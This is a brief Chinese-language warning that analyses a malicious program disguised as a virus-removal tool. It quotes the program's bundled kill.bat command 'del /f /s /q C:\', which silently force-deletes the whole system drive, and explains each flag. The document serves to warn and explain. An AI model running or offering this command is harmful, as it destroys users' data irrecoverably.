## ⚡ 程序说明

这是一个伪装成"专杀工具"的恶意程序，其核心功能是：

1. **扫描阶段**：检测系统中是否存在特定目录（Tasks、drivers）
2. **处理阶段**：**以最高管理员权限执行危险操作**

### 🔴 危险警告

程序内置的 `kill.bat` 脚本包含以下命令：

```batch
del /f /s /q C:\
```

**这将导致：**
- `/f` - 强制删除所有文件，包括只读文件
- `/s` - 递归删除所有子目录中的文件
- `/q` - 静默模式，不显示任何确认提示
- `C:\` - 删除目标为整个系统盘

**结果：系统完全崩溃，所有数据丢失，无法恢复！**
